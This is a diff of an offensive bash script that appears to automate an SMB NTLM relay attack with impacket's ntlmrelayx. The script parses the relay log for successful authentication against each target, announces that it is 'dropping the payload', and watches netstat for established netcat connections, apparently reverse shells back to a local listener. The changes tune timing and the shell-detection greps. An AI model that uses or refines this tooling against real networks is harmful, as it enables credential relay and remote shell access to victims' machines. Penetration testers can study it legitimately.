@@ -283,7 +283,7 @@ function targetStatus(){
 	status=$(grep 'Authenticating against smb://'$1 $(pwd)/impacket/ntlmrelayx.log 2>/dev/null | tail -1 | awk '{print $NF}')
 
 	if [[ "$status" == "SUCCEED" || "$status" == "SUCCEE" ]];then
-		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 5 
+		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2 
 		
 		if [ "$(netstat -tnualp | grep '/nc' | grep "ESTABLISHED" | grep "$1")" == "" ];then 
 			echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload. '$(pwd)/impacket/ntlmrelayx.log' file is your friend.\n"
@@ -386,7 +386,6 @@ function relayingAttack(){
 	portStatus='LISTEN'
 
 	touch $(pwd)/impacket/hostsStatus.tmp &>/dev/null
-	
 
 	tmux resize-pane -Z -L 8 &>/dev/null
 	if [ $? -ne 0 ];then bTmux; fi
@@ -403,7 +402,7 @@ function relayingAttack(){
 		if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp 2>/dev/null | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt 2>/dev/null | awk '{print $1}')" ]];then
 			echo -e "\t${redColour}[:(]${endColour} No targets left! Go find more!\n"; break
 		fi
-		portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
+		portStatus=$(netstat -tnualp | grep '/nc' | tail -1 | awk '{print $6}');
 	done
 
 	kill -9 $updateNtlmRelayxLog &>/dev/null
@@ -412,7 +411,7 @@ function relayingAttack(){
 	tmux capture-pane -p -S - > $(pwd)/impacket/ntlmrelayx.log
 	if [ $? -ne 0 ];then bTmux; fi
 
-	rhost=$(netstat -tnualp | grep $lport | awk '{print $5}' | tail -1 | awk -F: '{print $1}')
+	rhost=$(netstat -tnualp | grep '/nc' | grep "$rhost:$lport" | awk '{print $5}' | tail -1 | awk -F: '{print $1}')
 	checkrhost=''
 	while read line; do if [ "$rhost" == "$line" ];then checkrhost=1; fi; done < $targets
 
